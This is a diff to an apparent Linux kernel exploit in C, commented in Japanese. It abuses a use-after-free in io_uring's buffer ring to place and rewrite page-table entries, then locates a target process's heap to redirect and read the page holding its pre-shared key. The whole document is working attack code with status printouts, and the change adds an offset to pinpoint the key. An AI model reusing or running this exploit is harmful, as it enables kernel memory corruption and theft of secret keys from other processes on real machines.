@@ -20,6 +20,9 @@ const int BUSY_LOOP = 5;
 // psk の heap 領域からのオフセットは 0x5000 の場合が多い
 const int OFFSET = 0x5000;
 
+// psk のページ内オフセット
+const int PAGE_IN_OFFSET = 0x1f6;
+
 int main() {
     // 領域を3つ確保
     void *new_map_1 = mmap(
@@ -90,7 +93,7 @@ int main() {
     printf("[+] pbuf mapped at %p\n", pbuf_map);
 
     // ページフォルト: 1 回目
-    *(char *)new_map_1 = 'A';
+    *(uint8_t *)new_map_1 = 'A';
 
     // ring 解放
     io_uring_unregister_buf_ring(&ring, reg.bgid);
@@ -98,8 +101,8 @@ int main() {
     // ページフォルト: 2 回目
     // PTE が配置される
     // new_map_3 に秘密情報を誘導する
-    *(char *)new_map_2 = 'A';
-    *(char *)new_map_3 = 'A';
+    *(uint8_t *)new_map_2 = 'A';
+    *(uint8_t *)new_map_3 = 'A';
 
     dummy target_page;
     target_page.virt_addr = new_map_3;
@@ -107,11 +110,11 @@ int main() {
 
     // Use-After-Free
     // PTE が配置されているか確認
-    printf("[+] at %p: %lx\n", pbuf_map, *(unsigned long *)pbuf_map);
-    printf("[+] at %p: %lx\n", (unsigned long *)pbuf_map + 1, *((unsigned long *)pbuf_map + 1));
+    printf("[+] at %p: %lx\n", pbuf_map, *(uint64_t *)pbuf_map);
+    printf("[+] at %p: %lx\n", (uint64_t *)pbuf_map + 1, *((uint64_t *)pbuf_map + 1));
 
     // PTE 書き換え
-    // *(unsigned long *)pbuf_mapping = *((unsigned long *)pbuf_mapping + 1);
+    // *(uint64_t *)pbuf_map = *((uint64_t *)pbuf_map + 1);
 
     // ページ解放
     if (munmap(pbuf_map, 0x1000) == -1) perror("munmap() failed");
@@ -165,17 +168,19 @@ int main() {
     uint64_t heap_addr = get_heap_start_address(pid);
     printf("[+] heap address = 0x%lx\n", heap_addr);
 
-    // PSK のアドレス取得
-    uint64_t psk_addr = heap_addr + OFFSET;
-    printf("[+] psk address = 0x%lx\n", psk_addr);
+    // PSK が格納されているページのアドレス取得
+    uint64_t psk_page_addr = heap_addr + OFFSET;
+    printf("[+] psk address = 0x%lx\n", psk_page_addr);
 
     // 物理アドレス計算
-    uint64_t phys_addr = v2p(pid, (void *)psk_addr);
+    uint64_t phys_addr = v2p(pid, (void *)psk_page_addr);
     printf("[+] physical address = 0x%lx\n", phys_addr);
 
     // 誘導に成功したか確認
     if (target_page.phys_addr == phys_addr) {
         printf("[+] successfully lead to the target page\n");
+        uint64_t psk_addr = (uint64_t)new_map_2 + PAGE_IN_OFFSET; 
+        printf("[+] psk address = 0x%lx\n", psk_addr);
     } else {
         printf("[-] failed lead to the target page\n");
     }
